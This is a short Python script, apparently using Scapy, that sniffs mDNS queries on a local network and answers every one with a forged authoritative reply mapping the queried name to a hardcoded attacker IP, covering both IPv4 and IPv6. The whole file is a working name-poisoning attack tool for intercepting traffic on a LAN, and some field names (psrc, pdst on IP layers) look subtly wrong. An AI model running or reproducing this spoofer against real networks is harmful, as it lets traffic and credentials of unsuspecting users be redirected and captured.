from All import *

myIpv4 = "192.168.1.47"

def ismatch_mdns(pkt: Ether):
    return UDP in pkt and 5353 in (pkt[UDP].sport, pkt[UDP].dport) and DNSQR in pkt

def onmatch_mdns(pkt: Ether):
    """
    Receives a mDNS packet and reply with a spoofed packet saying
    that myIpv4 is the IP of that mDNS domain name.
    :param pkt: Ether
    :return: None
    """
    isIPv6 = IPv6 in pkt

    if isIPv6:
        psrc = pkt[IPv6].psrc
    else:
        psrc = pkt[IP].psrc
    sport = pkt[UDP].sport
    dport = pkt[UDP].dport
    name = pkt[DNSQR][0].qname

    print(f"Spoofing response for: {name} from ip: {psrc} -> {myIpv4}")

    eth = Ether(dst=pkt.src)
    udp = UDP(sport=dport, dport=sport)
    dns = DNS(id=pkt[DNS].id, aa=1, an=DNSRR(name=name, ttl=120, rdata=myIpv4))

    # Windows sends both IPv4 and IPv6 packets (with the same DNSQR), so we
    # need to check if the packet is IPv6 or IPv4 and send the correct packet.

    if isIPv6:
        spoofed_response = eth/IPv6(pdst=psrc)/udp/dns
    else:
        spoofed_response = eth/IP(pdst=psrc)/udp/dns

    send(spoofed_response)

sniff(ismatch_mdns, onmatch_mdns)
